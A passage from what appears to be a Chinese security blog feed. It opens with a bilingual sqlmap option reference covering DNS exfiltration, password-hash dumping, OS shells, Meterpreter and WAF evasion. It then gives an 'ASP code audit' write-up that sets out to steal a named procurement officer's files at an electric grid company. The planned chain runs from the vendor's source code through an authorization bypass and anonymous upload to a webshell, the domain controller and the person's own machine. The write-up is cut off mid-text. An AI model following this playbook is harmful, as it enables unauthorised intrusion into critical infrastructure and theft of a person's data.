class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Techniques（技巧）:</span><br><span class="line">These options can be used to tweak testing of specific SQL injection techniques</span><br><span class="line">## 这些选项可用于调整具体的SQL注入测试。</span><br><span class="line"></span><br><span class="line">--technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class="line">## SQL 注入技术测试（默认BEUST）</span><br><span class="line"></span><br><span class="line">--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)</span><br><span class="line">##  DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-cols=UCOLS Range of columns to test for UNION query SQL injection</span><br><span class="line">##  定列范围用于测试UNION查询注入</span><br><span class="line"></span><br><span class="line">--union-char=UCHAR Character to use for bruteforcing number of columns</span><br><span class="line">##  用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line">--union-from=UFROM Table to use in FROM part of UNION query SQL injection</span><br><span class="line">##  要在UNION查询SQL注入的FROM部分使用的表</span><br><span class="line"></span><br><span class="line">--dns-domain=DNS.. Domain name used for DNS exfiltration attack</span><br><span class="line">##  域名用于DNS漏出攻击</span><br><span class="line"></span><br><span class="line">--second-order=S.. Resulting page URL searched for second-order response</span><br><span class="line">## 生成页面的URL搜索为second-order响应</span><br></pre></td></tr></table></figure><h3 id="8、Fingerprint（指纹）"><a href="#8、Fingerprint（指纹）" class="headerlink" title="8、Fingerprint（指纹）"></a>8、Fingerprint（指纹）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Fingerprint（指纹）:</span><br><span class="line"></span><br><span class="line">-f, --fingerprint Perform an extensive DBMS version fingerprint</span><br><span class="line">## 执行检查广泛的DBMS版本指纹</span><br></pre></td></tr></table></figure><h3 id="9、Enumeration（枚举）"><a href="#9、Enumeration（枚举）" class="headerlink" title="9、Enumeration（枚举）"></a>9、Enumeration（枚举）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">Enumeration（枚举）:</span><br><span class="line"></span><br><span class="line">These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements</span><br><span class="line">## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</span><br><span class="line"></span><br><span class="line">-a, --all Retrieve everything</span><br><span class="line">## 检索一切</span><br><span class="line"></span><br><span class="line">-b, --banner Retrieve DBMS banner</span><br><span class="line">## 检索数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user Retrieve DBMS current user</span><br><span class="line">##  检索数据库管理系统的 标识</span><br><span class="line"></span><br><span class="line">--current-db Retrieve DBMS current database</span><br><span class="line">## 检索数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">-hostname Retrieve DBMS server hostname</span><br><span class="line">## 检索数据库服务器的主机名</span><br><span class="line"></span><br><span class="line">--is-dba Detect if the DBMS current user is DBA</span><br><span class="line">## 检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users Enumerate DBMS users</span><br><span class="line">## 枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords Enumerate DBMS users password hashes</span><br><span class="line">## 枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges Enumerate DBMS users privileges</span><br><span class="line">## 枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles Enumerate DBMS users roles</span><br><span class="line">## 枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs Enumerate DBMS databases</span><br><span class="line">## 枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables Enumerate DBMS database tables</span><br><span class="line">##  枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns Enumerate DBMS database table columns</span><br><span class="line">## 枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--schema Enumerate DBMS schema</span><br><span class="line">## 枚举数据库架构</span><br><span class="line"></span><br><span class="line">--count Retrieve number of entries for table(s)</span><br><span class="line">## 检索表的条目数</span><br><span class="line"></span><br><span class="line">--dump Dump DBMS database table entries</span><br><span class="line">##  转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--dump-all Dump all DBMS databases tables entries</span><br><span class="line">## 转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--search Search column(s), table(s) and/or database name(s)</span><br><span class="line">##  搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line"></span><br><span class="line">--comments Retrieve DBMS comments</span><br><span class="line">##  检索数据库的comments(注释、评论)</span><br><span class="line"></span><br><span class="line">-D DB DBMS database to enumerate</span><br><span class="line">## 要进行枚举的数据库名</span><br><span class="line"></span><br><span class="line">-T TBL DBMS database table(s) to enumerate</span><br><span class="line">##  要进行枚举的数据库表</span><br><span class="line"></span><br><span class="line">-C COL DBMS database table column(s) to enumerate</span><br><span class="line">## 要进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL DBMS database table column(s) to not enumerate</span><br><span class="line">## 要不进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-U USER DBMS user to enumerate</span><br><span class="line">## 用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs Exclude DBMS system databases when enumerating tables</span><br><span class="line">##  枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--pivot-column=P.. Pivot column name</span><br><span class="line">## 主列名称</span><br><span class="line"></span><br><span class="line">--where=DUMPWHERE Use WHERE condition while table dumping</span><br><span class="line">## 使用WHERE条件进行表转储</span><br><span class="line"></span><br><span class="line">--start=LIMITSTART First query output entry to retrieve</span><br><span class="line">##  第一个查询输出进入检索</span><br><span class="line"></span><br><span class="line">--stop=LIMITSTOP Last query output entry to retrieve</span><br><span class="line">## 最后查询的输出进入检索</span><br><span class="line"></span><br><span class="line">--first=FIRSTCHAR First query output word character to retrieve</span><br><span class="line">## 第一个查询输出字的字符检索</span><br><span class="line"></span><br><span class="line">--last=LASTCHAR Last query output word character to retrieve</span><br><span class="line">## 最后查询的输出字字符检索</span><br><span class="line"></span><br><span class="line">--sql-query=QUERY SQL statement to be executed</span><br><span class="line">## 要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell Prompt for an interactive SQL shell</span><br><span class="line">## 提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line">--sql-file=SQLFILE Execute SQL statements from given file(s)</span><br><span class="line">## 从给定文件执行SQL语句</span><br></pre></td></tr></table></figure><h3 id="10、Brute-Force（蛮力）"><a href="#10、Brute-Force（蛮力）" class="headerlink" title="10、Brute Force（蛮力）"></a>10、Brute Force（蛮力）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Brute force（蛮力）:</span><br><span class="line"></span><br><span class="line">These options can be used to run brute force checks</span><br><span class="line">## 这些选项可以被用来运行蛮力检查。</span><br><span class="line"></span><br><span class="line">--common-tables Check existence of common tables</span><br><span class="line">## 检查存在共同表</span><br><span class="line"></span><br><span class="line">--common-columns Check existence of common columns</span><br><span class="line">## 检查存在共同列</span><br></pre></td></tr></table></figure><h3 id="11、User-defined-function-injection（用户自定义函数注入）"><a href="#11、User-defined-function-injection（用户自定义函数注入）" class="headerlink" title="11、User-defined function injection（用户自定义函数注入）"></a>11、User-defined function injection（用户自定义函数注入）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User-defined function injection（用户自定义函数注入）:</span><br><span class="line"></span><br><span class="line">These options can be used to create custom user-defined functions</span><br><span class="line">## 这些选项可以用来创建用户自定义函数。</span><br><span class="line"></span><br><span class="line">--udf-inject Inject custom user-defined functions</span><br><span class="line">## 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib=SHLIB Local path of the shared library</span><br><span class="line">## 共享库的本地路径</span><br></pre></td></tr></table></figure><h3 id="12、File-system-access（访问文件系统）"><a href="#12、File-system-access（访问文件系统）" class="headerlink" title="12、File system access（访问文件系统）"></a>12、File system access（访问文件系统）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File system access（访问文件系统）:</span><br><span class="line">These options can be used to access the back-end database management system underlying file system</span><br><span class="line">## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line">--file-read=RFILE Read a file from the back-end DBMS file system</span><br><span class="line">## 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write=WFILE Write a local file on the back-end DBMS file system</span><br><span class="line">## 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">--file-dest=DFILE Back-end DBMS absolute filepath to write to</span><br><span class="line">## 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure><h3 id="13、Operating-system-access（操作系统访问）"><a href="#13、Operating-system-access（操作系统访问）" class="headerlink" title="13、Operating system access（操作系统访问）"></a>13、Operating system access（操作系统访问）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Operating system access（操作系统访问）:</span><br><span class="line"></span><br><span class="line">These options can be used to access the back-end database management system underlying operating system</span><br><span class="line">## 这些选项可以用于访问后端数据库管理系统的底层操作系统。</span><br><span class="line"></span><br><span class="line">--os-cmd=OSCMD Execute an operating system command</span><br><span class="line">## 执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell Prompt for an interactive operating system shell</span><br><span class="line">##  交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">--os-pwn Prompt for an OOB shell, Meterpreter or VNC</span><br><span class="line">## 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC</span><br><span class="line">## 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-bof Stored procedure buffer overflow exploitation</span><br><span class="line">## 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--priv-esc Database process user privilege escalation</span><br><span class="line">## 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework</span><br><span class="line">## 本地的安装路径</span><br><span class="line"></span><br><span class="line">--tmp-path=TMPPATH Remote absolute path of temporary files directory</span><br><span class="line">## 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure><h3 id="14、Windows-registry-access（Windows注册表访问）"><a href="#14、Windows-registry-access（Windows注册表访问）" class="headerlink" title="14、Windows registry access（Windows注册表访问）"></a>14、Windows registry access（Windows注册表访问）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows registry access（Windows注册表访问）:</span><br><span class="line"></span><br><span class="line">These options can be used to access the back-end database management system Windows registry</span><br><span class="line">## 这些选项可以被用来访问后端数据库管理系统Windows注册表。</span><br><span class="line"></span><br><span class="line">--reg-read Read a Windows registry key value</span><br><span class="line">## 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-add Write a Windows registry key value data</span><br><span class="line">## 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">--reg-del Delete a Windows registry key value</span><br><span class="line">## 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">--reg-key=REGKEY Windows registry key</span><br><span class="line">## Windows注册表键</span><br><span class="line"></span><br><span class="line">--reg-value=REGVAL Windows registry key value</span><br><span class="line">##  Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-data=REGDATA Windows registry key value data</span><br><span class="line">## Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">--reg-type=REGTYPE Windows registry key value type</span><br><span class="line">## Windows注册表项值类型</span><br></pre></td></tr></table></figure><h3 id="15、General（一般）"><a href="#15、General（一般）" class="headerlink" title="15、General（一般）"></a>15、General（一般）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">General（一般）:</span><br><span class="line"></span><br><span class="line">These options can be used to set some general working parameters</span><br><span class="line">## 这些选项可以用来设置一些一般的工作参数。</span><br><span class="line"></span><br><span class="line">-s SESSIONFILE Load session from a stored (.sqlite) file</span><br><span class="line">## 保存和恢复检索会话文件的所有数据</span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE Log all HTTP traffic into a textual file</span><br><span class="line">## 记录所有HTTP流量到一个文本文件中</span><br><span class="line"></span><br><span class="line">--batch Never ask for user input, use the default behaviour</span><br><span class="line">## 从不询问用户输入，使用所有默认配置。</span><br><span class="line"></span><br><span class="line">--binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;)</span><br><span class="line">## 具有二进制值的结果字段</span><br><span class="line"></span><br><span class="line">--charset=CHARSET Force character encoding used for data retrieval</span><br><span class="line">## 强制用于数据检索的字符编码</span><br><span class="line"></span><br><span class="line">--crawl=CRAWLDEPTH Crawl the website starting from the target URL</span><br><span class="line">## 从目标网址开始抓取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)</span><br><span class="line">## 正则表达式排除网页抓取</span><br><span class="line"></span><br><span class="line">--csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;)</span><br><span class="line">## 分隔CSV输出中使用的字符</span><br><span class="line"></span><br><span class="line">--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)</span><br><span class="line">## 转储数据的格式</span><br><span class="line"></span><br><span class="line">--eta Display for each output the estimated time of arrival</span><br><span class="line">## 显示每个输出的预计到达时间</span><br><span class="line"></span><br><span class="line">--flush-session Flush session files for current target</span><br><span class="line">## 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--forms Parse and test forms on target URL</span><br><span class="line">## 在目标网址上解析和测试表单</span><br><span class="line"></span><br><span class="line">--fresh-queries Ignore query results stored in session file</span><br><span class="line">## 忽略在会话文件中存储的查询结果</span><br><span class="line"></span><br><span class="line">--hex Use DBMS hex function(s) for data retrieval</span><br><span class="line">## 使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--output-dir=OUT.. Custom output directory path</span><br><span class="line">## 自定义输出目录路径</span><br><span class="line"></span><br><span class="line">--parse-errors Parse and display DBMS error messages from responses</span><br><span class="line">## 解析和显示响应中的DBMS错误消息</span><br><span class="line"></span><br><span class="line">--save=SAVECONFIG Save options to a configuration INI file</span><br><span class="line">## 保存选项到INI配置文件</span><br><span class="line"></span><br><span class="line">--scope=SCOPE Regexp to filter targets from provided proxy log</span><br><span class="line">## 使用正则表达式从提供的代理日志中过滤目标</span><br><span class="line"></span><br><span class="line">--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)</span><br><span class="line">## 根据有效负载和/或标题(e.g. ROW)选择测试</span><br><span class="line"></span><br><span class="line">--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)</span><br><span class="line">## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span><br><span class="line"></span><br><span class="line">--update Update sqlmap</span><br><span class="line">## 更新SqlMap</span><br></pre></td></tr></table></figure><h3 id="16、Miscellaneous（杂项）"><a href="#16、Miscellaneous（杂项）" class="headerlink" title="16、Miscellaneous（杂项）"></a>16、Miscellaneous（杂项）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Miscellaneous（杂项）:</span><br><span class="line"></span><br><span class="line">-z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class="line">## 使用简短的助记符</span><br><span class="line"></span><br><span class="line">--alert=ALERT Run host OS command(s) when SQL injection is found</span><br><span class="line">## 在找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--answers=ANSWERS Set question answers (e.g. &quot;quit=N,follow=N&quot;)</span><br><span class="line">## 设置问题答案</span><br><span class="line"></span><br><span class="line">--beep Beep on question and/or when SQL injection is found</span><br><span class="line">## 发现SQL 注入时提醒</span><br><span class="line"></span><br><span class="line">--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap</span><br><span class="line">## 具体的UDF和表清理DBMS</span><br><span class="line"></span><br><span class="line">--dependencies Check for missing (non-core) sqlmap dependencies</span><br><span class="line">## 检查是否缺少（非内核）sqlmap依赖关系</span><br><span class="line"></span><br><span class="line">--disable-coloring Disable console output coloring</span><br><span class="line">## 禁用控制台输出颜色</span><br><span class="line"></span><br><span class="line">--gpage=GOOGLEPAGE Use Google dork results from specified page number</span><br><span class="line">## 使用Google dork结果指定页码</span><br><span class="line"></span><br><span class="line">--identify-waf Make a thorough testing for a WAF/IPS/IDS protection</span><br><span class="line">## 对WAF / IPS / IDS保护进行全面测试</span><br><span class="line"></span><br><span class="line">--skip-waf Skip heuristic detection of WAF/IPS/IDS protection</span><br><span class="line">## 跳过启发式检测WAF / IPS / IDS保护</span><br><span class="line"></span><br><span class="line">--mobile Imitate smartphone through HTTP User-Agent header</span><br><span class="line">##  通过HTTP User-Agent标头模仿智能手机</span><br><span class="line"></span><br><span class="line">--offline Work in offline mode (only use session data)</span><br><span class="line">## 在离线模式下工作（仅使用会话数据）</span><br><span class="line"></span><br><span class="line">--page-rank Display page rank (PR) for Google dork results</span><br><span class="line">##  Google dork结果显示网页排名（PR）</span><br><span class="line"></span><br><span class="line">--purge-output Safely remove all content from output directory</span><br><span class="line">##  安全地从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--smart Conduct thorough tests only if positive heuristic(s)</span><br><span class="line">## 只有在正启发式时才进行彻底测试</span><br><span class="line"></span><br><span class="line">--sqlmap-shell Prompt for an interactive sqlmap shell</span><br><span class="line">## 提示交互式 sqlmap shell</span><br><span class="line"></span><br><span class="line">--wizard Simple wizard interface for beginner users</span><br><span class="line">## 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4、Asp代码审计--项目实战2</title>
      <link href="/article/4_Asp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%982.html"/>
      <url>/article/4_Asp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%982.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-任务背景："><a href="#0x00-任务背景：" class="headerlink" title="0x00 任务背景："></a>0x00 任务背景：</h2><p>需要得知周某某的今年采购的其中一个项目具体信息，目前已知该成员是xxx电网。负责丰满大坝的采购人员。整体思路如下：</p><ul><li>找到开发公司 -&gt; 得到源码 -&gt; 审计问题 -&gt; 得到shell -&gt; 拿到服务器 -&gt;</li><li>得到域控（或者终端管理） -&gt; 得到个人机 -&gt; 下载任务文件。</li></ul><p>得知该电网公司电网相关网站是某公司出品，得到某公司对外宣传网站，并且得到该公司服务器权限，下载源码模板。</p><h2 id="0x01-源码审计："><a href="#0x01-源码审计：" class="headerlink" title="0x01 源码审计："></a>0x01 源码审计：</h2><p>全局共计2个主要文件，分别是Function.asp，Startup.asp。</p><h3 id="1、Function-asp"><a href="#1、Function-asp" class="headerlink" title="1、Function.asp"></a>1、Function.asp</h3><p>后台验证项：  </p><ul><li>来源验证：  </li></ul><p><img src="../do/media/f3d00f2e404aed2ace94202fad9196e1.jpg" alt></p><ul><li>注入验证：（目标服务器waf，遂放弃）  </li></ul><p><img src="../do/media/69876bba47950df97d93d92afc6db16e.jpg" alt></p><ul><li>错误处理：  </li></ul><p><img src="../do/media/84612708e4d4f301fd655d48dc05267a.jpg" alt></p><ul><li>XSS字符处理：  </li></ul><p><img src="../do/media/2e3dd4d6f449ed860b790f4022b17291.jpg" alt></p><ul><li>直接输入admin/下文件名处理：  </li></ul><p><img src="../do/media/99f0ee3d3f7cd1ff3965502aff91bf1e.jpg" alt></p><ul><li>目录生成：针对iis6以及iis7 php版本  </li></ul><p><img src="../do/media/0a28fcfc4ba6e48eb857cc6b18e374e5.jpg" alt></p><h3 id="2、Startup-asp"><a href="#2、Startup-asp" class="headerlink" title="2、Startup.asp"></a>2、Startup.asp</h3><ul><li>配置文件：当不可以执行的时候，是否可以备份出数据库，以便下载。  </li></ul><p><img src="../do/media/47c48653bf1053dce5cee81320444f63.jpg" alt></p><ul><li>关于新闻显示，全局incude head.asp  </li></ul><p><img src="../do/media/2275d60bafee51dd0adf82a42b9d079b.jpg" alt></p><h3 id="3、check-si-asp"><a href="#3、check-si-asp" class="headerlink" title="3、check_si.asp"></a>3、check_si.asp</h3><p>其中 check_si.asp 主要为防止注入  </p><ul><li>Get注入  </li></ul><p><img src="../do/media/398190858612948b7bee70a83bd145c2.jpg" alt></p><ul><li>Post 注入 新版本中加入post注入</li></ul><p>过程中遇到服务器卡顿现象，也就是不清楚列名数，本地二分法测试如下：  </p><p><img src="../do/media/6c8bfb4c6de07bb3a93296288a15bbb0.jpg" alt>  </p><p><img src="../do/media/664d42e0571762dcbe9c25f6b43928b1.jpg" alt>  </p><p><img src="../do/media/f6c06ab3aefa6fffd987c9c7c90ed3e0.jpg" alt></p><h3 id="4、database-asp"><a href="#4、database-asp" class="headerlink" title="4、database.asp"></a>4、database.asp</h3><p>在 admin 目录下有个 database.asp 文件   </p><p><img src="../do/media/8271f2240cf178ee4a6fba221aeaedc2.jpg" alt></p><h2 id="0x02-目标测试："><a href="#0x02-目标测试：" class="headerlink" title="0x02 目标测试："></a>0x02 目标测试：</h2><h3 id="1、越权漏洞"><a href="#1、越权漏洞" class="headerlink" title="1、越权漏洞"></a>1、越权漏洞</h3><p>根据以上信息，构造 referrer，构造参数，禁止js。产生出越权漏洞。</p><p><img src="../do/media/5d66957a8586118f1ca10d23a0815a85.jpg" alt>  </p><p><img src="../do/media/bff69d4a2c2a89ef8703ec99fd8fc8e3.jpg" alt></p><h3 id="2、上传"><a href="#2、上传" class="headerlink" title="2、上传"></a>2、上传</h3><p>根据越权漏洞，继续看upload.asp文件，允许匿名上传图片文件。在根据越权漏洞备份出webshell文件</p><p><img src="../do/media/35aca0797d0299bb8c104d8be4bb3d6c.jpg" alt>  </p><p><img src="../do/media/cc1c8766b6439d3e3c011ae8250066ad.jpg" alt>  </p><p><img src="../do/media/18f0b435a0ce1ccbb750a46e4b8df563.jpg" alt>  </p><p><img src="../do/media/f1e074099cd43a5aa7057f57762b768f.jpg" alt>  </p><h3 id="3、Get-Shell"><a href="#3、Get-Shell" class="headerlink" title="3、Get Shell"></a>3、Get Shell</h3><p>得到webshell  </p><p><img 